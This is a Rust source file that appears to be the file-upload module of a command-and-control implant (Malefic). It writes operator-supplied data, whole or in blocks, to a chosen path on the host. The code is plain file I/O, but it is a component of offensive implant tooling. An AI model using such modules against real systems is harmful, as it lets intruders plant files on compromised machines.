// #[allow(non_snake_case)]
use crate::{check_field, Module, Result, TaskResult, check_request};
use malefic_helper::protobuf::implantpb::spite::Body;

use std::fs::OpenOptions;
use std::io::Write;
use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct Upload {
}

#[async_trait]
#[module_impl("upload")]
impl Module for Upload {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::UploadRequest)?;

        let target = check_field!(request.target)?;

        let mut file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(target)?;


            if request.data.is_empty() {
                // data为空，不执行任何操作或进行特定处理
            } else {
                // 当data不为空时，使用宏进行验证
                match check_field!(request.data) {
                    Ok(data) => {
                        // data验证通过时，执行写入操作
                        file.write_all(&data)?;
                        return Ok(TaskResult::new_with_ack(id, 0));
                    },
                    Err(e) => {
                        // 错误处理，根据您的需求处理或返回错误
                        return Err(e.into()); // 假设您的函数返回类型允许这样转换错误
                    },
                }
            }

        let _ = sender.send(TaskResult::new_with_ack(id, 0));
        loop {
            let block = check_request!(receiver, Body::Block)?;
            let _ = file.write_all(&block.content)?;

            if block.end {
                 return Ok(TaskResult::new_with_ack(id,block.block_id));
            }else{
                let _ = sender.send(TaskResult::new_with_ack(id, block.block_id));
            }
        }
    }
}